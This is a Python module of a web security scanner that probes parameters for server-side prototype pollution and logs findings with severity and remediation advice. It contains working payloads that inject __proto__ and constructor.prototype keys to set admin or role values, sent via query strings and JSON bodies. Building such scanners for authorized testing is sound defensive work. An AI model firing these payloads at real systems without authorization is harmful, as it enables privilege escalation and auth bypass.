"""
modules/proto_pollution.py
Prototype Pollution (client-side + server-side / SSPP) test module.

Covers:
  - Server-Side Prototype Pollution via GET query params
  - Server-Side Prototype Pollution via JSON body
  - Detection via elevated privileges, error signatures, or length differentials

Entry point: async def run(scanner) -> None

For Authorized Security Testing and CTF Competitions Only.
"""
from __future__ import annotations

import urllib.parse
from typing import TYPE_CHECKING

from core.models import Vulnerability, calculate_severity

if TYPE_CHECKING:
    from core.scanner import BaseScanner

# ── GET / form parameter pollution payloads ───────────────────────────────────
SSPP_GET_PAYLOADS = [
    {"__proto__[admin]": "true"},
    {"constructor[prototype][admin]": "true"},
    {"__proto__[isAdmin]": "1"},
    {"__proto__[role]": "admin"},
]

# ── JSON body payloads ────────────────────────────────────────────────────────
SSPP_JSON_PAYLOADS = [
    '{"__proto__":{"admin":true}}',
    '{"constructor":{"prototype":{"admin":true}}}',
    '{"__proto__":{"isAdmin":1}}',
    '{"__proto__":{"role":"admin"}}',
]

# Keywords suggesting prototype pollution was effective
POLLUTION_INDICATORS = [
    "admin", "isadmin", "administrator", "role", "elevated", "privilege",
    "polluted", "prototype", "constructor",
]

# Node.js / Express error signatures from malformed prototype
ERROR_SIGNATURES = [
    "cannot read propert", "typeerror", "property 'admin'", "prototype",
    "maximum call stack", "rangeerror",
]


async def run(scanner: "BaseScanner", url: str, param: str, method: str = "GET") -> None:
    """Test a single parameter for prototype pollution. Called per-param by scan_url()."""
    await _test_sspp(scanner, url, param, method)


async def _test_sspp(scanner: "BaseScanner", url: str, param: str, method: str) -> bool:
    # Fetch baseline
    baseline = await scanner.make_request(method, url, params={param: "test"})
    baseline_text = baseline.text if baseline else ""
    baseline_len = len(baseline_text)
    baseline_status = baseline.status_code if baseline else 0

    # ── GET / query-param pollution ───────────────────────────────────────────
    for extra_params in SSPP_GET_PAYLOADS:
        combined = dict(extra_params)
        combined[param] = "test"
        res = await scanner.make_request(method, url, params=combined)
        if not res:
            continue

        if _is_pollution_indicator(res, baseline_status, baseline_len, baseline_text):
            evidence = _build_evidence(res, baseline_len, combined)
            _log_sspp(scanner, url, param, str(combined), evidence, method)
            return True

    # ── JSON body pollution ───────────────────────────────────────────────────
    for json_payload in SSPP_JSON_PAYLOADS:
        res = await scanner.make_request(
            "POST", url, content=json_payload,
            headers={"Content-Type": "application/json"},
        )
        if not res:
            continue

        if _is_pollution_indicator(res, baseline_status, baseline_len, baseline_text):
            evidence = _build_evidence(res, baseline_len, json_payload)
            _log_sspp(scanner, url, param, json_payload[:100], evidence, "POST")
            return True

    return False


def _is_pollution_indicator(res, baseline_status: int, baseline_len: int, baseline_text: str) -> bool:
    body_lower = res.text.lower()

    # Auth bypass: was 401/403, now 200
    if baseline_status in (401, 403) and res.status_code == 200:
        return True

    # Pollution keywords in response
    if any(ind in body_lower for ind in POLLUTION_INDICATORS):
        # Only count if NOT already in baseline
        if not any(ind in baseline_text.lower() for ind in POLLUTION_INDICATORS):
            return True

    # Error signatures suggesting Node.js object mutation
    if any(sig in body_lower for sig in ERROR_SIGNATURES):
        return True

    # Significant length differential
    len_diff = abs(len(res.text) - baseline_len) / max(baseline_len, 1)
    if len_diff > 0.3 and res.status_code == 200:
        return True

    return False


def _build_evidence(res, baseline_len: int, payload) -> str:
    len_diff = abs(len(res.text) - baseline_len) / max(baseline_len, 1)
    return (
        f"Status {res.status_code} | "
        f"length diff {len_diff:.1%} | "
        f"payload: {str(payload)[:80]}"
    )


def _log_sspp(scanner, url: str, param: str, payload: str, evidence: str, method: str):
    sev, cvss = calculate_severity("Prototype Pollution (Server-Side)")
    scanner.log_vuln(Vulnerability(
        type="Prototype Pollution (Server-Side)",
        url=url,
        parameter=param,
        payload=payload,
        evidence=evidence,
        confidence="Medium",
        severity=sev,
        cvss_score=cvss,
        method=method,
        detection_method="SSPP via GET params / JSON body — response differential",
        remediation=(
            "Freeze the Object prototype: Object.freeze(Object.prototype). "
            "Use Object.create(null) for config objects. "
            "Validate and sanitize user-controlled keys before merging into objects. "
            "Use libraries like lodash >=4.17.21 that are hardened against this attack."
        ),
        references=["CWE-1321", "OWASP-A08:2021"],
        confidence_pct=55,
        indicators_matched=1,
    ))
